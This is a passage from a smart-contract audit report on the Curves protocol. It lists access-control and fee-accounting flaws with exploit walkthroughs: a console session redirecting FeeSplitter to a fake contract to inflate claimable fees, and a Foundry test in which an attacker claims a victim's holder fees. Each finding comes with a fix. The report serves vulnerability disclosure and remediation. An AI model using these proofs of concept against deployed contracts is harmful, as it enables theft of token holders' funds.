*Submitted by [parlayan\_yildizlar\_takimi](https://github.com/code-423n4/2024-01-curves-findings/issues/4), also found by [Avci](https://github.com/code-423n4/2024-01-curves-findings/issues/1508), [0x11singh99](https://github.com/code-423n4/2024-01-curves-findings/issues/1501), [visualbits](https://github.com/code-423n4/2024-01-curves-findings/issues/1464), [bigtone](https://github.com/code-423n4/2024-01-curves-findings/issues/1451), [djxploit](https://github.com/code-423n4/2024-01-curves-findings/issues/1448), [0xMango](https://github.com/code-423n4/2024-01-curves-findings/issues/1447), [Arion](https://github.com/code-423n4/2024-01-curves-findings/issues/1443), [Nachoxt17](https://github.com/code-423n4/2024-01-curves-findings/issues/1438), [m4ttm](https://github.com/code-423n4/2024-01-curves-findings/issues/1431), [Ephraim](https://github.com/code-423n4/2024-01-curves-findings/issues/1429), [GhK3Ndf](https://github.com/code-423n4/2024-01-curves-findings/issues/1427), [spark](https://github.com/code-423n4/2024-01-curves-findings/issues/1423), [karanctf](https://github.com/code-423n4/2024-01-curves-findings/issues/1420), [LeoGold](https://github.com/code-423n4/2024-01-curves-findings/issues/1419), [peritoflores](https://github.com/code-423n4/2024-01-curves-findings/issues/1417), [Matue](https://github.com/code-423n4/2024-01-curves-findings/issues/1398), [dutra](https://github.com/code-423n4/2024-01-curves-findings/issues/1381), [dyoff](https://github.com/code-423n4/2024-01-curves-findings/issues/1378), [vnavascues](https://github.com/code-423n4/2024-01-curves-findings/issues/1355), [Josephdara\_0xTiwa](https://github.com/code-423n4/2024-01-curves-findings/issues/1344), [SanketKogekar](https://github.com/code-423n4/2024-01-curves-findings/issues/1329), [Kose](https://github.com/code-423n4/2024-01-curves-findings/issues/1319), [Faith](https://github.com/code-423n4/2024-01-curves-findings/issues/1304), [McToady](https://github.com/code-423n4/2024-01-curves-findings/issues/1275), [santipu\_](https://github.com/code-423n4/2024-01-curves-findings/issues/1271), [imare](https://github.com/code-423n4/2024-01-curves-findings/issues/1266), [jangle](https://github.com/code-423n4/2024-01-curves-findings/issues/1264), [Aymen0909](https://github.com/code-423n4/2024-01-curves-findings/issues/1249), [ktg](https://github.com/code-423n4/2024-01-curves-findings/issues/1235), [ivanov](https://github.com/code-423n4/2024-01-curves-findings/issues/1210), bengyles ([1](https://github.com/code-423n4/2024-01-curves-findings/issues/1202), [2](https://github.com/code-423n4/2024-01-curves-findings/issues/173)), [Nikki](https://github.com/code-423n4/2024-01-curves-findings/issues/1192), [0xAadi](https://github.com/code-423n4/2024-01-curves-findings/issues/1185), [kuprum](https://github.com/code-423n4/2024-01-curves-findings/issues/1178), [Zach\_166](https://github.com/code-423n4/2024-01-curves-findings/issues/1168), [c0pp3rscr3w3r](https://github.com/code-423n4/2024-01-curves-findings/issues/1164), [0xhashiman](https://github.com/code-423n4/2024-01-curves-findings/issues/1163), [burhan\_khaja](https://github.com/code-423n4/2024-01-curves-findings/issues/1149), [anshujalan](https://github.com/code-423n4/2024-01-curves-findings/issues/1146), [The-Seraphs](https://github.com/code-423n4/2024-01-curves-findings/issues/1130), [mitev](https://github.com/code-423n4/2024-01-curves-findings/issues/1129), [Soul22](https://github.com/code-423n4/2024-01-curves-findings/issues/1121), [ArsenLupin](https://github.com/code-423n4/2024-01-curves-findings/issues/1119), [rouhsamad](https://github.com/code-423n4/2024-01-curves-findings/issues/1118), [DimaKush](https://github.com/code-423n4/2024-01-curves-findings/issues/1108), [tonisives](https://github.com/code-423n4/2024-01-curves-findings/issues/1107), [kodak\_rome](https://github.com/code-423n4/2024-01-curves-findings/issues/1104), [adamn000](https://github.com/code-423n4/2024-01-curves-findings/issues/1092), [TermoHash](https://github.com/code-423n4/2024-01-curves-findings/issues/1086), [nazirite](https://github.com/code-423n4/2024-01-curves-findings/issues/1083), [0xStalin](https://github.com/code-423n4/2024-01-curves-findings/issues/1073), [baice](https://github.com/code-423n4/2024-01-curves-findings/issues/1062), [Ryonen](https://github.com/code-423n4/2024-01-curves-findings/issues/1057), [cu5t0mpeo](https://github.com/code-423n4/2024-01-curves-findings/issues/1048), [whoismatthewmc1](https://github.com/code-423n4/2024-01-curves-findings/issues/1046), [FastChecker](https://github.com/code-423n4/2024-01-curves-findings/issues/1029), [bbl4de](https://github.com/code-423n4/2024-01-curves-findings/issues/1016), [Mike\_Bello90](https://github.com/code-423n4/2024-01-curves-findings/issues/1013), [erebus](https://github.com/code-423n4/2024-01-curves-findings/issues/976), [ether\_sky](https://github.com/code-423n4/2024-01-curves-findings/issues/945), [Draiakoo](https://github.com/code-423n4/2024-01-curves-findings/issues/934), [opposingmonkey](https://github.com/code-423n4/2024-01-curves-findings/issues/921), [btk](https://github.com/code-423n4/2024-01-curves-findings/issues/914), [azanux](https://github.com/code-423n4/2024-01-curves-findings/issues/912), [0xSmartContract](https://github.com/code-423n4/2024-01-curves-findings/issues/909), [XDZIBECX](https://github.com/code-423n4/2024-01-curves-findings/issues/899), [Varun\_05](https://github.com/code-423n4/2024-01-curves-findings/issues/891), [ahmedaghadi](https://github.com/code-423n4/2024-01-curves-findings/issues/889), [novodelta](https://github.com/code-423n4/2024-01-curves-findings/issues/882), [Mj0ln1r](https://github.com/code-423n4/2024-01-curves-findings/issues/880), [Berring](https://github.com/code-423n4/2024-01-curves-findings/issues/866), [VigilantE](https://github.com/code-423n4/2024-01-curves-findings/issues/863), [MrPotatoMagic](https://github.com/code-423n4/2024-01-curves-findings/issues/855), [0xc0ffEE](https://github.com/code-423n4/2024-01-curves-findings/issues/846), [LouisTsai](https://github.com/code-423n4/2024-01-curves-findings/issues/845), [nonseodion](https://github.com/code-423n4/2024-01-curves-findings/issues/836), [forkforkdog](https://github.com/code-423n4/2024-01-curves-findings/issues/832), [codegpt](https://github.com/code-423n4/2024-01-curves-findings/issues/826), [Kong](https://github.com/code-423n4/2024-01-curves-findings/issues/818), [DanielArmstrong](https://github.com/code-423n4/2024-01-curves-findings/issues/798), [kodyvim](https://github.com/code-423n4/2024-01-curves-findings/issues/794), [0xprinc](https://github.com/code-423n4/2024-01-curves-findings/issues/788), [Cosine](https://github.com/code-423n4/2024-01-curves-findings/issues/769), [salutemada](https://github.com/code-423n4/2024-01-curves-findings/issues/766), [th13vn](https://github.com/code-423n4/2024-01-curves-findings/issues/763), [Inspex](https://github.com/code-423n4/2024-01-curves-findings/issues/761), [popelev](https://github.com/code-423n4/2024-01-curves-findings/issues/758), [grearlake](https://github.com/code-423n4/2024-01-curves-findings/issues/755), [zhaojie](https://github.com/code-423n4/2024-01-curves-findings/issues/742), [\_eperezok](https://github.com/code-423n4/2024-01-curves-findings/issues/729), [jacopod](https://github.com/code-423n4/2024-01-curves-findings/issues/727), [0xNaN](https://github.com/code-423n4/2024-01-curves-findings/issues/723), [PoeAudits](https://github.com/code-423n4/2024-01-curves-findings/issues/720), [Oxsadeeq](https://github.com/code-423n4/2024-01-curves-findings/issues/713), [khramov](https://github.com/code-423n4/2024-01-curves-findings/issues/704), [0xblackskull](https://github.com/code-423n4/2024-01-curves-findings/issues/700), [bareli](https://github.com/code-423n4/2024-01-curves-findings/issues/682), [KHOROAMU](https://github.com/code-423n4/2024-01-curves-findings/issues/678), [para8956](https://github.com/code-423n4/2024-01-curves-findings/issues/674), [KingNFT](https://github.com/code-423n4/2024-01-curves-findings/issues/661), [0xPhantom](https://github.com/code-423n4/2024-01-curves-findings/issues/656), [13u9](https://github.com/code-423n4/2024-01-curves-findings/issues/654), [sl1](https://github.com/code-423n4/2024-01-curves-findings/issues/618), [AmitN](https://github.com/code-423n4/2024-01-curves-findings/issues/612), [wangxx2026](https://github.com/code-423n4/2024-01-curves-findings/issues/609), [pipidu83](https://github.com/code-423n4/2024-01-curves-findings/issues/606), [XORs33r](https://github.com/code-423n4/2024-01-curves-findings/issues/599), [mahdirostami](https://github.com/code-423n4/2024-01-curves-findings/issues/597), [Prathik3](https://github.com/code-423n4/2024-01-curves-findings/issues/596), [merlinboii](https://github.com/code-423n4/2024-01-curves-findings/issues/575), [PENGUN](https://github.com/code-423n4/2024-01-curves-findings/issues/570), [jasonxiale](https://github.com/code-423n4/2024-01-curves-findings/issues/564), [pep7siup](https://github.com/code-423n4/2024-01-curves-findings/issues/558), [lukejohn](https://github.com/code-423n4/2024-01-curves-findings/issues/536), [spacelord47](https://github.com/code-423n4/2024-01-curves-findings/issues/532), [danb](https://github.com/code-423n4/2024-01-curves-findings/issues/529), [dd0x7e8](https://github.com/code-423n4/2024-01-curves-findings/issues/515), [Lirios](https://github.com/code-423n4/2024-01-curves-findings/issues/514), [0xLogos](https://github.com/code-423n4/2024-01-curves-findings/issues/508), [alexfilippov314](https://github.com/code-423n4/2024-01-curves-findings/issues/478), [DMoore](https://github.com/code-423n4/2024-01-curves-findings/issues/475), [iamandreiski](https://github.com/code-423n4/2024-01-curves-findings/issues/471), [PetarTolev](https://github.com/code-423n4/2024-01-curves-findings/issues/469), [zhaojohnson](https://github.com/code-423n4/2024-01-curves-findings/issues/441), [iberry](https://github.com/code-423n4/2024-01-curves-findings/issues/440), [eeshenggoh](https://github.com/code-423n4/2024-01-curves-findings/issues/435), [zxriptor](https://github.com/code-423n4/2024-01-curves-findings/issues/412), [Kaysoft](https://github.com/code-423n4/2024-01-curves-findings/issues/399), [SovaSlava](https://github.com/code-423n4/2024-01-curves-findings/issues/398), [oreztker](https://github.com/code-423n4/2024-01-curves-findings/issues/390), [nmirchev8](https://github.com/code-423n4/2024-01-curves-findings/issues/389), [UbiquitousComputing](https://github.com/code-423n4/2024-01-curves-findings/issues/384), [dimulski](https://github.com/code-423n4/2024-01-curves-findings/issues/380), [BowTiedOriole](https://github.com/code-423n4/2024-01-curves-findings/issues/374), [jesjupyter](https://github.com/code-423n4/2024-01-curves-findings/issues/368), [SpicyMeatball](https://github.com/code-423n4/2024-01-curves-findings/issues/362), [zaevlad](https://github.com/code-423n4/2024-01-curves-findings/issues/356), [Lef](https://github.com/code-423n4/2024-01-curves-findings/issues/342), [Bobface](https://github.com/code-423n4/2024-01-curves-findings/issues/335), [darksnow](https://github.com/code-423n4/2024-01-curves-findings/issues/319), [KupiaSec](https://github.com/code-423n4/2024-01-curves-findings/issues/314), [hals](https://github.com/code-423n4/2024-01-curves-findings/issues/291), [Stormreckson](https://github.com/code-423n4/2024-01-curves-findings/issues/279), [0x111](https://github.com/code-423n4/2024-01-curves-findings/issues/277), [klau5](https://github.com/code-423n4/2024-01-curves-findings/issues/273), [ke1caM](https://github.com/code-423n4/2024-01-curves-findings/issues/264), [peanuts](https://github.com/code-423n4/2024-01-curves-findings/issues/257), [n1punp](https://github.com/code-423n4/2024-01-curves-findings/issues/252), [cats](https://github.com/code-423n4/2024-01-curves-findings/issues/250), [EV\_om](https://github.com/code-423n4/2024-01-curves-findings/issues/246), [bronze\_pickaxe](https://github.com/code-423n4/2024-01-curves-findings/issues/217), [cartlex\_](https://github.com/code-423n4/2024-01-curves-findings/issues/208), [rudolph](https://github.com/code-423n4/2024-01-curves-findings/issues/196), [L0s1](https://github.com/code-423n4/2024-01-curves-findings/issues/178), [deepplus](https://github.com/code-423n4/2024-01-curves-findings/issues/167), [Inference](https://github.com/code-423n4/2024-01-curves-findings/issues/155), [0xMAKEOUTHILL](https://github.com/code-423n4/2024-01-curves-findings/issues/150), [lil\_eth](https://github.com/code-423n4/2024-01-curves-findings/issues/145), [polarzero](https://github.com/code-423n4/2024-01-curves-findings/issues/138), [Timenov](https://github.com/code-423n4/2024-01-curves-findings/issues/137), [IceBear](https://github.com/code-423n4/2024-01-curves-findings/issues/127), [nuthan2x](https://github.com/code-423n4/2024-01-curves-findings/issues/125), [ubl4nk](https://github.com/code-423n4/2024-01-curves-findings/issues/121), [skyge](https://github.com/code-423n4/2024-01-curves-findings/issues/114), [AlexCzm](https://github.com/code-423n4/2024-01-curves-findings/issues/110), [andywer](https://github.com/code-423n4/2024-01-curves-findings/issues/84), [mrudenko](https://github.com/code-423n4/2024-01-curves-findings/issues/83), [alexbabits](https://github.com/code-423n4/2024-01-curves-findings/issues/82), [pipoca](https://github.com/code-423n4/2024-01-curves-findings/issues/64), [Timeless](https://github.com/code-423n4/2024-01-curves-findings/issues/43), [y4y](https://github.com/code-423n4/2024-01-curves-findings/issues/36), [kutugu](https://github.com/code-423n4/2024-01-curves-findings/issues/30), [Krace](https://github.com/code-423n4/2024-01-curves-findings/issues/25), [ravikiranweb3](https://github.com/code-423n4/2024-01-curves-findings/issues/15), [haxatron](https://github.com/code-423n4/2024-01-curves-findings/issues/9), and [Soliditors](https://github.com/code-423n4/2024-01-curves-findings/issues/7)*

The `FeeSplitter.sol` contract, which is responsible for fee distribution and claiming, contains a significant security vulnerability related to the `setCurves` function. This function allows updating the reference to the `Curves` contract. However, as it currently stands, any user, including a malicious actor, can call `setCurves`. This vulnerability can be exploited to redirect the contract's reference to a fake or malicious `Curves` contract (`FakeCurves.sol`), enabling manipulation of critical calculations used in fee distribution.

The exploit allows an attacker to set arbitrary values for `curvesTokenBalance` and `curvesTokenSupply` in the fake `Curves` contract. By manipulating these values, the attacker can falsely inflate their claimable fees, leading to unauthorized profit at the expense of legitimate token holders.

### Proof of Concept

**Steps:**

1. Deploy the `FeeSplitter` and `FakeCurves` contracts.
2. As an attacker, call `setCurves` on `FeeSplitter` to update the `curves` reference to the deployed `FakeCurves` contract.
3. Manipulate `curvesTokenBalance` and `curvesTokenSupply` in `FakeCurves` to create false balances and supplies.
4. Call `getClaimableFees` in `FeeSplitter` to calculate inflated claimable fees based on the manipulated values.
5. Observe that the attacker is able to claim fees that they are not entitled to.

**Code:**

```python
>>> feeRedistributor.getClaimableFees(randomToken, attacker)
0
>>> feeRedistributor.setCurves(fakeCurves,{'from': attacker})
Transaction sent: 0x6480994a739ab1541d4eb596fd73a49d55b59b6c7080a7cbb10d0b72f619b799
  Gas price: 0.0 gwei   Gas limit: 12000000   Nonce: 9
  FeeSplitter.setCurves confirmed   Block: 17   Gas used: 27607 (0.23%)

<Transaction '0x6480994a739ab1541d4eb596fd73a49d55b59b6c7080a7cbb10d0b72f619b799'>
>>> fakeCurves.setCurvesTokenSupply(randomToken, 250, {'from': attacker})
Transaction sent: 0xd9c0938f9876348657bf5ef8e7e84706b0ddf287da69169716ca6af22a3c059d
  Gas price: 0.0 gwei   Gas limit: 12000000   Nonce: 10
  FakeCurves.setCurvesTokenSupply confirmed   Block: 18   Gas used: 22786 (0.19%)

<Transaction '0xd9c0938f9876348657bf5ef8e7e84706b0ddf287da69169716ca6af22a3c059d'>
>>> fakeCurves.setCurvesTokenBalance(randomToken, attacker, 249, {'from': attacker})
Transaction sent: 0x742b4aac4d03210fc4869a75dd625fdbf52838655f57ddf8e028dfbaa6818932
  Gas price: 0.0 gwei   Gas limit: 12000000   Nonce: 11
  FakeCurves.setCurvesTokenBalance confirmed   Block: 19   Gas used: 23361 (0.19%)

<Transaction '0x742b4aac4d03210fc4869a75dd625fdbf52838655f57ddf8e028dfbaa6818932'>
>>> feeRedistributor.getClaimableFees(randomToken, attacker)
996000000000000000
```

### Recommended Mitigation Steps

To mitigate this vulnerability, the `setCurves` function in `FeeSplitter.sol` should be restricted to be callable only by the owner or a trusted manager. This can be achieved by using the `onlyOwner` or `onlyManager` modifier (from the inherited `Security.sol` contract) in the `setCurves` function.

The modified `setCurves` function should look like this:

```solidity
function setCurves(Curves curves_) public onlyOwner {
    curves = curves_;
}
```

or, if managers are also trusted to perform this action,

```solidity
function setCurves(Curves curves_) public onlyManager {
    curves = curves_;
}
```

**[andresaiello (Curves) confirmed](https://github.com/code-423n4/2024-01-curves-findings/issues/4#issuecomment-1908728504)**

***

## [[H-05] Malformed equate statement](https://github.com/code-423n4/2024-01-curves-findings/issues/17)

*Submitted by [ChaseTheLight](https://github.com/code-423n4/2024-01-curves/blob/main/bot-report.md#h-01-malformed-equate-statement)*

*Note: This finding was reported via the winning [Automated Findings report](include link to bot-report.md file). It was declared out of scope for the audit, but is being included here for completeness.*

### Lines of code

[8](https://github.com/code-423n4/2024-01-curves/blob/main/contracts/Security.sol#L8-L9), [13](https://github.com/code-423n4/2024-01-curves/blob/main/contracts/Security.sol#L13-L14)

### Vulnerability details

Using the provided modifier `onlyOwner` for function access control without a proper enforcement mechanism like `require` or `revert` is a dire mistake because it fails to restrict access as intended. The modifier merely evaluates a condition (`msg.sender == owner`) without any action taken based on the result. This means any user, regardless of whether they are the owner, can execute functions that are supposed to be restricted to the owner, potentially leading to unauthorized actions, such as withdrawing funds or altering critical contract settings.

### Recommended Mitigation

To fix this, the modifier should enforce the ownership check using a `require` statement:

```solidity
modifier onlyOwner() {
  require(msg.sender == owner, "Caller is not the owner");
  _;
}
```

With this correction, the modifier effectively ensures that only the account designated as `owner` can access the function. If a non-owner attempts to call the function, the transaction is reverted, maintaining the intended access control and contract integrity.

```solidity
8:     modifier onlyOwner() { // <= FOUND
9:         msg.sender == owner; // <= FOUND
10:         _;
11:     }
```

```solidity
13:     modifier onlyManager() { // <= FOUND
14:         managers[msg.sender] == true; // <= FOUND
15:         _;
16:     }
```

**[andresaiello (Curves) confirmed](https://github.com/code-423n4/2024-01-curves-findings/issues/17#issuecomment-1908728049)**

***
 
# Medium Risk Findings (10)
## [[M-01] Protocol and referral fee would be permanently stuck in the Curves contract when selling a token](https://github.com/code-423n4/2024-01-curves-findings/issues/1294)
*Submitted by [anshujalan](https://github.com/code-423n4/2024-01-curves-findings/issues/1294), also found by [lukejohn](https://github.com/code-423n4/2024-01-curves-findings/issues/1549), [zxriptor](https://github.com/code-423n4/2024-01-curves-findings/issues/1546), [ether\_sky](https://github.com/code-423n4/2024-01-curves-findings/issues/1531), [ahmedaghadi](https://github.com/code-423n4/2024-01-curves-findings/issues/1500), [0x0bserver](https://github.com/code-423n4/2024-01-curves-findings/issues/1446), [0x11singh99](https://github.com/code-423n4/2024-01-curves-findings/issues/1366), [todorc](https://github.com/code-423n4/2024-01-curves-findings/issues/1262), [Aymen0909](https://github.com/code-423n4/2024-01-curves-findings/issues/1246), [c0pp3rscr3w3r](https://github.com/code-423n4/2024-01-curves-findings/issues/1208), [FastChecker](https://github.com/code-423n4/2024-01-curves-findings/issues/1199), [ro1sharkm](https://github.com/code-423n4/2024-01-curves-findings/issues/1186), [tonisives](https://github.com/code-423n4/2024-01-curves-findings/issues/1114), [adeolu](https://github.com/code-423n4/2024-01-curves-findings/issues/1110), [cu5t0mpeo](https://github.com/code-423n4/2024-01-curves-findings/issues/1102), [whoismatthewmc1](https://github.com/code-423n4/2024-01-curves-findings/issues/1100), [Oxsadeeq](https://github.com/code-423n4/2024-01-curves-findings/issues/1098), [Silvermist](https://github.com/code-423n4/2024-01-curves-findings/issues/1078), [Ryonen](https://github.com/code-423n4/2024-01-curves-findings/issues/1033), [ktg](https://github.com/code-423n4/2024-01-curves-findings/issues/996), [nonseodion](https://github.com/code-423n4/2024-01-curves-findings/issues/990), [CDSecurity](https://github.com/code-423n4/2024-01-curves-findings/issues/979), [MrPotatoMagic](https://github.com/code-423n4/2024-01-curves-findings/issues/952), santipu\_ ([1](https://github.com/code-423n4/2024-01-curves-findings/issues/902), [2](https://github.com/code-423n4/2024-01-curves-findings/issues/900)), [grearlake](https://github.com/code-423n4/2024-01-curves-findings/issues/887), [dimulski](https://github.com/code-423n4/2024-01-curves-findings/issues/885), BowTiedOriole ([1](https://github.com/code-423n4/2024-01-curves-findings/issues/875), [2](https://github.com/code-423n4/2024-01-curves-findings/issues/379)), [codegpt](https://github.com/code-423n4/2024-01-curves-findings/issues/827), [Cosine](https://github.com/code-423n4/2024-01-curves-findings/issues/767), [\_eperezok](https://github.com/code-423n4/2024-01-curves-findings/issues/728), [khramov](https://github.com/code-423n4/2024-01-curves-findings/issues/703), [rouhsamad](https://github.com/code-423n4/2024-01-curves-findings/issues/692), [para8956](https://github.com/code-423n4/2024-01-curves-findings/issues/683), [Topmark](https://github.com/code-423n4/2024-01-curves-findings/issues/677), [0xPhantom](https://github.com/code-423n4/2024-01-curves-findings/issues/664), [XORs33r](https://github.com/code-423n4/2024-01-curves-findings/issues/652), [aslanbek](https://github.com/code-423n4/2024-01-curves-findings/issues/638), [sl1](https://github.com/code-423n4/2024-01-curves-findings/issues/628), [dd0x7e8](https://github.com/code-423n4/2024-01-curves-findings/issues/622), [mrudenko](https://github.com/code-423n4/2024-01-curves-findings/issues/594), [mahdirostami](https://github.com/code-423n4/2024-01-curves-findings/issues/525), [fishgang](https://github.com/code-423n4/2024-01-curves-findings/issues/494), [alexfilippov314](https://github.com/code-423n4/2024-01-curves-findings/issues/479), [zhaojohnson](https://github.com/code-423n4/2024-01-curves-findings/issues/451), [SovaSlava](https://github.com/code-423n4/2024-01-curves-findings/issues/414), [hals](https://github.com/code-423n4/2024-01-curves-findings/issues/401), [UbiquitousComputing](https://github.com/code-423n4/2024-01-curves-findings/issues/383), [SpicyMeatball](https://github.com/code-423n4/2024-01-curves-findings/issues/349), [KupiaSec](https://github.com/code-423n4/2024-01-curves-findings/issues/312), [klau5](https://github.com/code-423n4/2024-01-curves-findings/issues/276), [cats](https://github.com/code-423n4/2024-01-curves-findings/issues/270), [cccz](https://github.com/code-423n4/2024-01-curves-findings/issues/230), [DanielArmstrong](https://github.com/code-423n4/2024-01-curves-findings/issues/212), [developerjordy](https://github.com/code-423n4/2024-01-curves-findings/issues/211), [Soliditors](https://github.com/code-423n4/2024-01-curves-findings/issues/169), [deepplus](https://github.com/code-423n4/2024-01-curves-findings/issues/164), [Inference](https://github.com/code-423n4/2024-01-curves-findings/issues/157), [nuthan2x](https://github.com/code-423n4/2024-01-curves-findings/issues/135), [petro\_1912](https://github.com/code-423n4/2024-01-curves-findings/issues/55), and [haxatron](https://github.com/code-423n4/2024-01-curves-findings/issues/14)*

During the sale of a token `Curves._transferFee` subtracts all the fees from the selling price and transfers the remaining to the seller [here](<https://github.com/code-423n4/2024-01-curves/blob/main/contracts/Curves.sol#L231>).

```solidity
        uint256 sellValue = price - protocolFee - subjectFee - referralFee - holderFee;
        (bool success1, ) = firstDestination.call{value: isBuy ? buyValue : sellValue}("");
```

However, the `protocolFee` taken away is not transferred to the `protocolFeeDestination` in the remainder of the `_transferFee` function [here](<https://github.com/code-423n4/2024-01-curves/blob/main/contracts/Curves.sol#L231-L250>). It stays back in the contract with no other of way of retrieval.

Furthermore, `referralFee` is taken away without checking if a referral address actually exists. In the event that there is no referral defined, the third transfer is never executed [here](<https://github.com/code-423n4/2024-01-curves/blob/main/contracts/Curves.sol#L240>). This leaves the referral fee in the contract, again no retrieval mechanism.

### Recommended Mitigation Steps

The `buyValue` ([here](<https://github.com/code-423n4/2024-01-curves/blob/main/contracts/Curves.sol#L230C59-L230C59>)) variable already has the logic for jointly handling the protocol and referral fee. It can be given a more generic name, and be transferred to the `protocolDestination` for both buying and selling transactions.

```solidit
    uint256 protocolShare = referralDefined ? protocolFee : protocolFee + referralFee;
    uint256 sellValue = price - protocolFee - subjectFee - referralFee - holderFee;

    (bool success, ) = (feesEconomics.protocolFeeDestination).call{value: protocolShare}("");
    if (!success) revert CannotSendFunds();
    if(!isBuy) {
        (bool success1, ) = (msg.sender).call{value: sellValue}("");
        if(!success1) revert CannotSendFunds();
    }
```

**[alcueca (Judge) decreased severity to Medium](https://github.com/code-423n4/2024-01-curves-findings/issues/1294#issuecomment-1922137714)**

**[andresaiello (Curves) acknowledged](https://github.com/code-423n4/2024-01-curves-findings/issues/1294#issuecomment-2073079291)**

***

## [[M-02] Theft of holder fees when `holderFeePercent` was positive and is set to zero](https://github.com/code-423n4/2024-01-curves-findings/issues/895)
*Submitted by [santipu\_](https://github.com/code-423n4/2024-01-curves-findings/issues/895), also found by [zhaojie](https://github.com/code-423n4/2024-01-curves-findings/issues/748), [\_eperezok](https://github.com/code-423n4/2024-01-curves-findings/issues/733), [SpicyMeatball](https://github.com/code-423n4/2024-01-curves-findings/issues/470), [rvierdiiev](https://github.com/code-423n4/2024-01-curves-findings/issues/74), and [BowTiedOriole](https://github.com/code-423n4/2024-01-curves-findings/issues/376)*

In the Curves protocol, a holder fee is imposed on all buy and sell transactions. This fee is distributed among share holders via the `FeeSplitter` contract, incentivizing long-term holding over frequent trading. The `_transferFees()` function plays a crucial role in this process by transferring the holder fee to `FeeSplitter`.

```solidity
    if (feesEconomics.holdersFeePercent > 0 && address(feeRedistributor) != address(0)) {
        feeRedistributor.onBalanceChange(curvesTokenSubject, msg.sender);
        feeRedistributor.addFees{value: holderFee}(curvesTokenSubject);
    }
```

This code ensures that `onBalanceChange()` and `addFees()` are called only when `holdersFeePercent` is non-zero, deeming `FeeSplitter` unnecessary otherwise.

A critical vulnerability arises when the `holderFeePercent`, initially set to a positive value, is later changed to zero. In this case, previously collected holder fees remain in the `FeeSplitter`, awaiting distribution. The absence of `onBalanceChange()` calls in such scenarios allows new shareholders to unjustly claim these fees, leading to a potential theft of funds.

### Impact

When the holder fee is reduced from a positive value to zero, new shareholders can exploit this to illicitly claim holder fees from `FeeSplitter`. This theft is not only limited to these new shareholders but can also be perpetuated across multiple addresses, progressively draining the `FeeSplitter` of its ETH reserves.

### Proof of Concept

The PoC can be executed in a standard Foundry environment for the Curves project. The test is conducted using the command `forge test --match-test testSetHolderFeeZero`.

The test mimics an attack where a new shareholder exploits the system to claim holder fees that rightfully belong to previous shareholders.

<details>

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.7;

import {Test, console2, console, stdError} from "forge-std/Test.sol";
import {Curves} from "src/Curves.sol";
import {CurvesERC20Factory} from "src/CurvesERC20Factory.sol";
import {FeeSplitter} from "src/FeeSplitter.sol";
import {CurvesERC20} from "src/CurvesERC20.sol";

contract CurvesTest is Test {
    CurvesERC20Factory public factory;
    Curves public curves;
    FeeSplitter public feeSplitter;

    function setUp() public {
        factory = new CurvesERC20Factory();
        feeSplitter = new FeeSplitter();
        curves = new Curves(address(factory), address(feeSplitter));

        feeSplitter.setCurves(curves);
        feeSplitter.setManager(address(curves), true);
    }

    function testSetHolderFeeZero() public {
        address subject = makeAddr("subject");
        address attacker = makeAddr("attacker");
        address victim = makeAddr("victim");

        // Subject mints first share to allow trading
        vm.prank(subject);
        curves.buyCurvesToken(subject, 1);

        // Holder fee is set at 5%
        vm.startPrank(address(curves));
        curves.setMaxFeePercent(0.05e18);
        curves.setExternalFeePercent(0, 0, 0.05e18);
        vm.stopPrank();

        // Victim buys some shares
        uint256 price = curves.getBuyPriceAfterFee(subject, 10);
        deal(victim, price);
        vm.prank(victim);
        curves.buyCurvesToken{value: price}(subject, 10);
        assertEq(curves.curvesTokenBalance(subject, victim), 10);

        // Holder fee is set at 0%
        vm.prank(address(curves));
        curves.setExternalFeePercent(0, 0, 0);

        // Attacker buys some shares
        price = curves.getBuyPriceAfterFee(subject, 10);
        deal(attacker, price);
        vm.prank(attacker);
        curves.buyCurvesToken{value: price}(subject, 10);
        assertEq(curves.curvesTokenBalance(subject, attacker), 10);

        uint256 balanceFeeSplitterBefore = address(feeSplitter).balance;
        uint256 balanceAttackerBefore = address(attacker).balance;
        uint256 victimFees = feeSplitter.getClaimableFees(subject, victim);

        // Now, attacker can claim victim's holder fees
        vm.prank(attacker);
        feeSplitter.claimFees(subject);

        uint256 balanceFeeSplitterAfter = address(feeSplitter).balance;
        uint256 balanceAttackerAfter = address(attacker).balance;

        // Attacker has claimed victim's holder fees
        assertEq(balanceFeeSplitterBefore - balanceFeeSplitterAfter, victimFees);
        assertEq(balanceAttackerAfter - balanceAttackerBefore, victimFees);

        // Now, victim cannot claim them
        vm.prank(victim);
        vm.expectRevert();
        // Call reverts with "EvmError: OutOfFund" because the contract has no funds to transfer
        feeSplitter.claimFees(subject);
    }
}
```

</details>

### Recommended Mitigation Steps

To prevent this exploitation, it is advised to always call `onBalanceChange()` in `_transferFees()`, regardless of the `holdersFeePercent` status. This ensures continuous and accurate tracking of shareholder balances and rightful fee distribution, even when the holder fee is set to zero.

```diff
+       feeRedistributor.onBalanceChange(curvesTokenSubject, msg.sender);  

        if (feesEconomics.holdersFeePercent > 0 && address(feeRedistributor) != address(0)) {
-           feeRedistributor.onBalanceChange(curvesTokenSubject, msg.sender);
            feeRedistributor.addFees{value: holderFee}(curvesTokenSubject);
        }
```

**[andresaiello (Curves) confirmed, but disagreed with severity and commented](https://github.com/code-423n4/2024-01-curves-findings/issues/895#issuecomment-1908633810):**
 > Not high, because a DAO is responsible for that change, but will fix it.

**[alcueca (Judge) decreased severity to Medium and commented](https://github.com/code-423n4/2024-01-curves-findings/issues/895#issuecomment-1944575754):**
 > Even after merging [#1491](https://github.com/code-423n4/2024-01-curves-findings/issues/1491) with [#247](https://github.com/code-423n4/2024-01-curves-findings/issues/247) which is more general, it still doesn't cover the issue here that unclaimed fees need to be considered if changing the holders fee to zero.

***

## [[M-03] If a user sets their curve token symbol as the default one plus the next token counter instance it will render the whole default naming functionality obsolete](https://github.com/code-423n4/2024-01-curves-findings/issues/647)
